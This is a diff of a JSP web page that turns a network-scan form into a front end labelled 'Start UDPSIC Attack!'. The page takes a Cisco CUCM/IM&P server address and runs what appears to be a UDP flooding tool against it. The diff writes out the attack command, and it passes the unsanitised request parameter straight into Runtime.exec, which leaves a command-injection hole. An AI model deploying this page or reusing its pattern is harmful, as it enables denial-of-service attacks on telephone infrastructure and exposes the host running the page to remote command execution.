@@ -48,10 +48,10 @@ body{
 
 <center>
 <br><br>
-<h3>Kindly provide the network address (Ex: 192.168.1.0/24). Thank you!</h3>
+<h3>Kindly provide the CUCM/IM&P IP Address (Ex: 192.168.1.20,5060). Thank you!</h3>
 <form name="myForm" >
-       <input type="text" name="address" placeholder="192.168.1.0/24" required/> 
-        <input type="submit" value="Start network scan now" onclick="netRes"/>
+       <input type="text" name="address" placeholder="192.168.1.20,5060"/> 
+        <input type="submit" value="Start UDPSIC Attack!" onclick="netRes"/>
     </form>
     
  
@@ -61,7 +61,7 @@ body{
 <form name="result" id="netRes" >
 <textarea rows="20" cols="70">
 <%
-String cmd = "nmap -sP " + request.getParameter("address");  
+String cmd = "udpsic -s rand -d " + request.getParameter("address") + " -p 211363 -r 103334";  
 if (cmd.contains(".")){
 Runtime run = Runtime.getRuntime(); 
 Process pr = run.exec(cmd); 
@@ -73,6 +73,7 @@ while ((line=buf.readLine())!=null) {
 	
 out.println(line);
 	}
+pr.destroy();
 }
 %>
 </textarea>
